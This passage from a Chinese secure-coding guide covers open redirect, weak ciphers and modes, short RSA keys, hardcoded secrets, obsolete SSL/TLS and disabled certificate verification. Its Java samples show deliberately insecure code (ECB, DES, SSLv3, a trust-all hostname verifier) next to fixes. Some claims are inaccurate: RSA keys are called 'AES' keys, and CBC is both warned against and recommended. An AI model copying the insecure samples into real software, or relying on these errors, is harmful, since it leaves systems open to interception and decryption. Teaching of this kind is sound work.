title="开放重定向"></a>开放重定向</h2><p><strong>问题描述：</strong><br>开放重定向漏洞使得攻击者能够构造特定的URL，将用户重定向到恶意站点，从而进行钓鱼攻击、劫持会话或其他形式的社会工程学攻击。攻击者通常会利用应用程序中允许未经验证的外部URL进行重定向的点来实施此类攻击。这种漏洞通常出现在应用程序使用未经验证的用户输入来动态构造重定向URL时。<br><strong>修复建议：</strong></p><ol><li><strong>严格验证和白名单</strong>：验证和限制允许重定向到的URL，确保它们只能指向受信任的站点或应用内部的有效URL。可以使用白名单技术来限制重定向目标的范围。</li><li><strong>避免使用用户可控制的URL</strong>：尽可能避免使用用户控制的输入来构造重定向URL。如果必须使用，确保对输入进行严格的验证和清理，以移除恶意重定向的可能性。</li><li><strong>使用安全的重定向方法</strong>：根据具体的应用需求，考虑使用框架或库提供的安全重定向方法，这些方法通常能够处理安全性问题，如Spring MVC中的RedirectAttributes来安全地重定向。</li><li><strong>记录和监控</strong>：记录所有重定向操作，包括目标URL和源URL，以便及时检测和响应可能的恶意行为。</li><li><strong>教育和培训</strong>：提高开发团队对开放重定向漏洞的认识和理解，包括如何识别、预防和修复此类问题。</li></ol><h1 id="加密相关"><a href="#加密相关" class="headerlink" title="加密相关"></a>加密相关</h1><h2 id="不安全的加密模式"><a href="#不安全的加密模式" class="headerlink" title="不安全的加密模式"></a>不安全的加密模式</h2><p><strong>问题描述：</strong><br>块密码操作模式是一种算法，用来描述如何重复地应用密码的单块操作，以安全地转换大于块的数据量。一些操作模式包括电子代码本 (ECB)、密码块链 (CBC)、密码反馈 (CFB) 和计数器 (CTR)。<br>ECB 模式本质上较弱，因为它会对相同的明文块生成一样的密文。CBC 模式容易受到密文填塞攻击。CTR 模式由于没有这些缺陷，使之成为一个更好的选择。<br>例如以下代码使用了AES的ECB加密模式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(keyBytes, <span class="hljs-string">&quot;AES&quot;</span>);<br><span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/ECB/PKCS7Padding&quot;</span>, <span class="hljs-string">&quot;BC&quot;</span>);<br>cipher.init(Cipher.ENCRYPT_MODE, key);<br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong><br>加密大于块的数据时，避免使用 ECB 和 CBC 操作模式。CBC 模式效率较低，并且在和 SSL 一起使用时会造成严重风险 [1]。请改用 CCM (Counter with CBC-MAC) 模式，或者如果更注重性能，则使用 GCM（Galois&#x2F;Counter Mode）模式（如可用）。<br>如下列代码使用了GCM模式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(keyBytes, <span class="hljs-string">&quot;AES&quot;</span>);<br><span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/GCM/PKCS5Padding&quot;</span>, <span class="hljs-string">&quot;BC&quot;</span>);<br>cipher.init(Cipher.ENCRYPT_MODE, key);<br></code></pre></td></tr></table></figure><h2 id="不安全的加密算法"><a href="#不安全的加密算法" class="headerlink" title="不安全的加密算法"></a>不安全的加密算法</h2><p><strong>问题描述：</strong><br>使用不安全的加密算法可以使敏感数据容易被破解，从而导致数据泄露和安全漏洞。过时的或弱的加密算法（如DES和MD5）因其较低的密钥长度和已知的弱点，不能提供足够的保护，容易受到暴力破解或密码攻击。此外，使用不正确的加密模式和填充机制也可能导致加密方案的安全性降低。随着计算能力的增强，一些曾经被认为是安全的算法现在也可能变得容易被破解。<br>如下列代码使用了不安全的DES算法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.KeyGenerator;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKey;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeEncryptionExample</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">KeyGenerator</span> <span class="hljs-variable">keyGenerator</span> <span class="hljs-operator">=</span> KeyGenerator.getInstance(<span class="hljs-string">&quot;DES&quot;</span>);<br>        <span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> keyGenerator.generateKey();<br>        <br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;DES/ECB/PKCS5Padding&quot;</span>);<br>        cipher.init(Cipher.ENCRYPT_MODE, secretKey);<br>        <br>        <span class="hljs-type">String</span> <span class="hljs-variable">plainText</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Sensitive Information&quot;</span>;<br>        <span class="hljs-type">byte</span>[] encryptedText = cipher.doFinal(plainText.getBytes());<br>        System.out.println(<span class="hljs-string">&quot;Encrypted: &quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encryptedText));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><ol><li>使用强加密算法：采用行业认可的强加密标准，如AES（高级加密标准），并使用足够长的密钥（如AES-256）。</li><li>选择合适的加密模式：使用如CBC（密码块链接）或GCM（加密计数器模式）等安全的加密模式，它们可以提供完整性和认证。</li><li>使用安全的库：利用成熟的加密库（如Java的javax.crypto库或第三方库Bouncy Castle）来实现加密和解密，避免自己实现加密算法。</li><li>定期更新和审查加密措施：随着新的安全漏洞和攻击方法的出现，定期更新和审查使用的加密算法和实践，确保它们符合当前的安全标准。</li></ol><p>下列代码中使用了AES的GCM模式进行加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.KeyGenerator;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKey;<br><span class="hljs-keyword">import</span> javax.crypto.spec.GCMParameterSpec;<br><span class="hljs-keyword">import</span> java.security.SecureRandom;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureGcmEncryptionExample</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">KeyGenerator</span> <span class="hljs-variable">keyGenerator</span> <span class="hljs-operator">=</span> KeyGenerator.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>        keyGenerator.init(<span class="hljs-number">256</span>); <span class="hljs-comment">// 使用256位长的密钥</span><br>        <span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> keyGenerator.generateKey();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">GCM_IV_LENGTH</span> <span class="hljs-operator">=</span> <span class="hljs-number">12</span>; <span class="hljs-comment">// GCM推荐的IV长度为12字节</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">GCM_TAG_LENGTH</span> <span class="hljs-operator">=</span> <span class="hljs-number">128</span>; <span class="hljs-comment">// GCM推荐的认证标签长度为128位</span><br><br>        <span class="hljs-type">byte</span>[] iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[GCM_IV_LENGTH];<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureRandom</span>().nextBytes(iv);<br>        <span class="hljs-type">GCMParameterSpec</span> <span class="hljs-variable">gcmParameterSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GCMParameterSpec</span>(GCM_TAG_LENGTH, iv);<br><br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/GCM/NoPadding&quot;</span>);<br>        cipher.init(Cipher.ENCRYPT_MODE, secretKey, gcmParameterSpec);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">plainText</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Sensitive Information&quot;</span>;<br>        <span class="hljs-type">byte</span>[] encryptedText = cipher.doFinal(plainText.getBytes());<br>        System.out.println(<span class="hljs-string">&quot;Encrypted securely with GCM: &quot;</span> + java.util.Base64.getEncoder().encodeToString(encryptedText));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="密钥大小不足（RSA）"><a href="#密钥大小不足（RSA）" class="headerlink" title="密钥大小不足（RSA）"></a>密钥大小不足（RSA）</h2><p><strong>问题描述：</strong><br>RSA加密是一种广泛使用的非对称加密算法，其安全性在很大程度上依赖于密钥的长度。较小的RSA密钥长度（如1024位）虽然在过去被认为是安全的，但随着计算能力的提升，这些较小的密钥现在更容易受到攻击，如分解大整数的攻击。如果RSA密钥长度不足，加密系统可能面临安全风险，包括密钥被破解和敏感数据泄露。例如，1024位RSA密钥的破解已在理论和实践中被证明是可行的，而更长的密钥（如2048位或更高）则提供了更强的安全保障。<br>如下列代码使用了1024位的AES密钥进行加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WeakRsaKeyExample</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> KeyPair <span class="hljs-title function_">generateWeakRSAKeyPair</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;<br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGen</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        keyPairGen.initialize(<span class="hljs-number">1024</span>); <span class="hljs-comment">// 不推荐使用的较短密钥长度</span><br>        <span class="hljs-keyword">return</span> keyPairGen.generateKeyPair();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">weakKeyPair</span> <span class="hljs-operator">=</span> generateWeakRSAKeyPair();<br>        System.out.println(<span class="hljs-string">&quot;Generated weak RSA key pair with key size: &quot;</span> + weakKeyPair.getPrivate().getEncoded().length * <span class="hljs-number">8</span> + <span class="hljs-string">&quot; bits&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><ol><li>使用建议的最小密钥长度：对于RSA加密，目前推荐使用至少2048位的密钥长度，对于需要长期安全的应用，甚至建议使用3072位或4096位。</li><li>定期更新密钥：除了使用足够长的密钥外，定期更换密钥也是保持加密强度的重要措施。</li><li>使用安全的密钥生成方法：使用强随机数生成器和经过验证的库来生成RSA密钥，确保密钥的随机性和安全性。</li></ol><p>如下列代码使用了2048位的AES密钥进行加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StrongRsaKeyExample</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> KeyPair <span class="hljs-title function_">generateStrongRSAKeyPair</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;<br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGen</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        keyPairGen.initialize(<span class="hljs-number">2048</span>); <span class="hljs-comment">// 推荐使用的较长密钥长度</span><br>        <span class="hljs-keyword">return</span> keyPairGen.generateKeyPair();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">strongKeyPair</span> <span class="hljs-operator">=</span> generateStrongRSAKeyPair();<br>        System.out.println(<span class="hljs-string">&quot;Generated strong RSA key pair with key size: &quot;</span> + strongKeyPair.getPrivate().getEncoded().length * <span class="hljs-number">8</span> + <span class="hljs-string">&quot; bits&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="硬编码的密码"><a href="#硬编码的密码" class="headerlink" title="硬编码的密码"></a>硬编码的密码</h2><p><strong>问题描述：</strong><br>硬编码的密码是指在应用程序的源代码、配置文件或其他内部结构中直接以明文形式存储的密码。这种做法极大地降低了系统的安全性，因为任何能够访问到这些信息的人（例如，通过源代码管理系统、文件系统访问权限或者通过其他软件漏洞）都能够获得这些敏感信息。此外，硬编码的密码很难进行更改，这意味着一旦密码泄露，整个系统的安全性就会长期受到影响。这种做法违反了安全最佳实践，特别是最小权限原则和密码管理策略。<br><strong>修复建议：</strong><br>绝不能对密码进行硬编码。通常情况下，应对密码进行模糊处理，并在外部资源文件中进行管理。在系统中的任何位置采用明文的形式存储密码，会造成任何有足够权限的人均可读取和无意中误用密码。<br>采用其他的方式存储密码，例如将敏感信息，如密码，存储在环境变量中。这样，应用程序可以在运行时读取这些值，而不需要在代码中硬编码。</p><h2 id="硬编码的加密密钥"><a href="#硬编码的加密密钥" class="headerlink" title="硬编码的加密密钥"></a>硬编码的加密密钥</h2><p><strong>问题描述：</strong><br>在软件开发中，硬编码加密密钥是指将加密密钥直接嵌入到源代码或配置文件中的做法。这种方法容易导致密钥泄露，因为任何能够访问代码或配置文件的人都可以获取到密钥。此外，一旦密钥泄露，修改密钥将需要更新和重新部署应用程序，这会增加维护成本和安全风险。<br><strong>修复建议：</strong></p><ol><li>环境变量或外部存储：将密钥存储在环境变量中或使用外部安全存储（如密钥管理服务）。</li><li>密钥旋转和管理：实现密钥旋转机制，定期更换密钥，并确保旧密钥可以安全地退役。</li><li>加密配置文件：如果必须在配置文件中保存密钥，应确保该文件被加密，且加密密钥安全管理。</li><li>访问控制和审计：对存储密钥的系统实施严格的访问控制和审计，确保只有授权用户可以访问密钥。</li><li>使用密钥派生函数：如果适用，使用密钥派生函数（如PBKDF2、Argon2）从密码生成密钥，而非使用硬编码密钥。</li></ol><h2 id="硬编码的API凭据"><a href="#硬编码的API凭据" class="headerlink" title="硬编码的API凭据"></a>硬编码的API凭据</h2><p><strong>问题描述：</strong><br>硬编码的API凭据指的是在应用程序的源代码中直接编写API密钥、密码或其他认证令牌。这种做法极大地降低了安全性，因为任何能够查看源代码的人（例如开发人员、攻击者通过源代码泄露等方式）都能够获得这些敏感信息。此外，一旦这些凭据被硬编码，更换凭据变得非常困难，因为它们可能被分散在多个文件或代码库中。如果这些凭据被泄露，可能导致未授权访问、数据泄露、财务损失或其他安全事件。<br><strong>修复建议：</strong></p><ol><li>环境变量：将敏感凭据存储在环境变量中。这样，凭据不需要直接写在代码中，而是可以在运行时从环境中读取。</li><li>配置文件：使用配置文件存储凭据，并确保这些配置文件不会被包含在版本控制系统中。对于生产环境，应加密这些配置文件。</li><li>密钥管理服务：利用专门的密钥管理服务，如AWS Secrets Manager、Azure Key Vault等，来安全地存储和管理敏感凭据。这些服务还提供了访问控制和审计功能，可以追踪谁何时访问了凭据。</li><li>权限最小化：确保使用凭据的应用程序或服务只有执行其必要功能所需的最小权限。</li><li>定期轮换凭据：定期更换API密钥和密码，以减少被泄露凭据所带来的风险。</li></ol><h2 id="配置文件中的明文密码"><a href="#配置文件中的明文密码" class="headerlink" title="配置文件中的明文密码"></a>配置文件中的明文密码</h2><p><strong>问题描述：</strong><br>在软件配置文件中以明文形式存储密码是一种常见的安全隐患。这种做法会使密码容易被任何有权限访问这些文件的人员发现，包括恶意用户。这不仅违反了数据保护的最佳实践，比如加密存储敏感信息，而且一旦这些配置文件被泄露，就会导致严重的安全风险，比如未授权访问和数据泄露。此外，由于配置文件通常需要在多个环境中同步，这进一步增加了敏感信息泄露的可能性。<br><strong>修复建议：</strong></p><ol><li>环境变量：使用环境变量存储敏感信息，如密码。这允许应用程序在运行时读取这些信息，而不将其硬编码在文件中。</li><li>密钥管理系统：使用专门的密钥管理系统来存储和管理敏感信息，如AWS Secrets Manager、HashiCorp Vault等。这些系统为存储、访问和管理敏感数据提供了额外的安全层。</li><li>加密配置文件：如果必须在配置文件中存储敏感信息，确保对这些信息进行加密。只有应用程序在运行时才能解密这些信息。</li><li>配置管理工具：使用配置管理工具，如Spring Cloud Config、Consul等，它们支持从外部源加载配置信息，并且可以提供加密和安全访问机制。</li></ol><h2 id="测试文件中的明文密码"><a href="#测试文件中的明文密码" class="headerlink" title="测试文件中的明文密码"></a>测试文件中的明文密码</h2><p><strong>问题描述：</strong><br>在测试文件或代码中硬编码明文密码是一种常见的不安全做法。尽管这些密码可能仅用于测试目的，但将它们存储为明文可能会带来多种安全风险。例如，如果测试代码或数据被意外地包括在生产环境中，或者源代码库被未经授权的个人访问，这些硬编码的密码可能会被泄露。此外，测试环境往往不如生产环境安全，使用明文密码增加了被攻击的可能性。<br><strong>修复建议：</strong></p><ol><li>使用环境变量：在测试环境中，将敏感凭据存储在环境变量中，而不是直接在测试脚本或配置文件中硬编码。</li><li>加密配置文件：如果必须在配置文件中使用密码，应确保这些文件被适当加密，并且加密密钥被安全地管理。</li><li>使用密钥管理系统：利用如AWS Secrets Manager、Azure Key Vault等密钥管理服务来存储和访问测试环境中使用的凭据。</li><li>模拟身份验证：在可能的情况下，尽量避免在测试中使用实际的用户账户和密码。可以使用模拟（Mocking）技术来模拟身份验证过程。</li></ol><h1 id="协议相关"><a href="#协议相关" class="headerlink" title="协议相关"></a>协议相关</h1><h2 id="不安全的传输协议"><a href="#不安全的传输协议" class="headerlink" title="不安全的传输协议"></a>不安全的传输协议</h2><p><strong>问题描述：</strong><br>SSL (Secure Sockets Layer) 和早期的 TLS (Transport Layer Security) 版本，如 SSLv2、SSLv3、TLSv1.0 和 TLSv1.1，已被证实包含多个安全漏洞，这些漏洞使得这些协议不再安全。这些协议的缺陷包括诸如BEAST、POODLE、CRIME等攻击，这些攻击能够解密使用这些协议加密的传输数据。因此，使用这些旧协议传输敏感数据极其危险，可能导致数据泄露、会话劫持和其他安全威胁。现代加密通信应该使用更新的协议版本，如TLSv1.2或TLSv1.3，它们提供了更强的加密算法和增强的安全性。<br>例如如下代码使用了不安全的SSLv3作为通信协议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InsecureSSLExample</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">SSLContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SSLContext.getInstance(<span class="hljs-string">&quot;SSLv3&quot;</span>);<br>        context.init(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">SSLSocketFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> context.getSocketFactory();<br>        <span class="hljs-type">SSLSocket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> (SSLSocket) factory.createSocket(<span class="hljs-string">&quot;example.com&quot;</span>, <span class="hljs-number">443</span>);<br>        <span class="hljs-comment">// 不安全的连接示例</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><ol><li>升级到TLSv1.2或TLSv1.3：确保所有加密通信使用TLSv1.2或更高版本。这些版本修复了之前版本的安全漏洞，并提供了更强的安全保证。</li><li>配置服务器和客户端：在服务器和客户端配置中禁用SSLv2、SSLv3、TLSv1.0和TLSv1.1。确保只接受安全的协议版本。</li><li>定期更新和打补丁：定期更新操作系统、应用程序和库，以包括对SSL&#x2F;TLS协议的最新安全补丁和改进。</li><li>加密策略审查和更新：定期审查加密策略和配置，确保它们符合最新的行业最佳实践和合规要求。</li><li>使用安全的密码套件：除了升级协议版本外，还应使用安全的密码套件，避免使用已被破解的或被认为是弱密码套件。</li></ol><p>例如如下代码使用了安全的TLSv1.2作为传输协议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureSSLExample</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">SSLContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SSLContext.getInstance(<span class="hljs-string">&quot;TLSv1.2&quot;</span>);  <span class="hljs-comment">// 使用TLSv1.2</span><br>        context.init(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">SSLSocketFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> context.getSocketFactory();<br>        <span class="hljs-type">SSLSocket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> (SSLSocket) factory.createSocket(<span class="hljs-string">&quot;example.com&quot;</span>, <span class="hljs-number">443</span>);<br>        <span class="hljs-comment">// 安全的连接示例</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="未配置内容安全策略CSP"><a href="#未配置内容安全策略CSP" class="headerlink" title="未配置内容安全策略CSP"></a>未配置内容安全策略CSP</h2><p><strong>问题描述：</strong><br>内容安全策略（Content Security Policy, CSP）是一种安全标准，用于预防跨站脚本（XSS）攻击和其他一些注入类型的攻击。CSP通过白名单控制哪些资源可以被浏览器加载和执行，以此提高网站的安全性。未配置CSP或配置不当的CSP可以让网站易受XSS攻击，攻击者可以注入恶意脚本，窃取敏感数据、篡改页面内容或进行其他恶意活动。未配置CSP的网站没有利用浏览器提供的这一额外安全层保护，使其更容易受到前端攻击。<br><strong>修复建议：</strong></p><ol><li>启用并正确配置CSP：通过HTTP响应头Content-Security-Policy启用CSP，并严格限制脚本来源、样式、图片、字体、表单目标和其他资源的加载。确保仅允许从可信来源加载资源。</li><li>避免使用unsafe-inline和unsafe-eval指令：这些指令允许行内脚本和eval执行，降低CSP的效果。尽量避免使用它们，以提高政策的效果。</li><li>定期审查和更新CSP：随着应用程序的发展，定期审查和更新CSP规则，以确保它们仍然有效并且符合当前的内容安全需求。</li><li>使用报告机制：在CSP中使用report-uri或report-to指令，将违反政策的报告发送到服务器。这有助于识别可能的攻击和配置错误。</li><li>进行彻底的测试：在部署CSP之前，对网站进行彻底的测试，确保策略不会阻断合法资源的加载，影响网站功能。</li></ol><h2 id="服务器身份验证关闭"><a href="#服务器身份验证关闭" class="headerlink" title="服务器身份验证关闭"></a>服务器身份验证关闭</h2><p><strong>问题描述：</strong><br>在SSL&#x2F;TLS连接中，服务器身份验证是确保客户端与真正的服务器进行通信的关键步骤。这一过程通常涉及验证服务器提供的SSL&#x2F;TLS证书，确保其由受信任的证书颁发机构（CA）签发，且与所请求的服务器域名匹配。如果服务器身份验证被禁用，客户端可能会无法确认其正在与预期的服务器进行安全通信，这可能导致中间人攻击（MITM），攻击者可以拦截、修改或重定向数据传输。<br>例如如下代码通过自定义verify方法来关闭身份验证：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InsecureConnection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HttpsURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpsURLConnection) <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;https://example.com&quot;</span>).openConnection();<br>        connection.setHostnameVerifier(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HostnameVerifier</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(String hostname, SSLSession session)</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 不安全，因为它不进行任何验证</span><br>            &#125;<br>        &#125;);<br>        trustAllHttpsCertificates(connection); <span class="hljs-comment">// 假设这个方法使连接信任所有证书</span><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">trustAllHttpsCertificates</span><span class="hljs-params">(HttpsURLConnection conn)</span> &#123;<br>        <span class="hljs-comment">// 实现细节假设，信任所有证书的逻辑</span><br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><ol><li>始终启用服务器身份验证：在SSL&#x2F;TLS连接中，确保总是进行服务器身份验证。不应有任何情况下禁用此功能。</li><li>使用正确配置的SSL&#x2F;TLS证书：使用由受信任CA签发的证书，并确保证书中包含正确的服务器名称（即服务器的域名）。</li><li>检查证书撤销状态：在接受证书之前，检查其是否被颁发机构撤销。这可以通过在线证书状态协议（OCSP）或证书撤销列表（CRL）来完成。</li><li>强制证书链验证：确保SSL&#x2F;TLS库或使用的框架验证证书链的所有部分，直到根证书。</li><li>使用安全编程实践：在编写用于建立SSL&#x2F;TLS连接的代码时，使用安全库和遵循最佳实践，确保不会因配置错误而禁用安全功能。</li></ol><h2 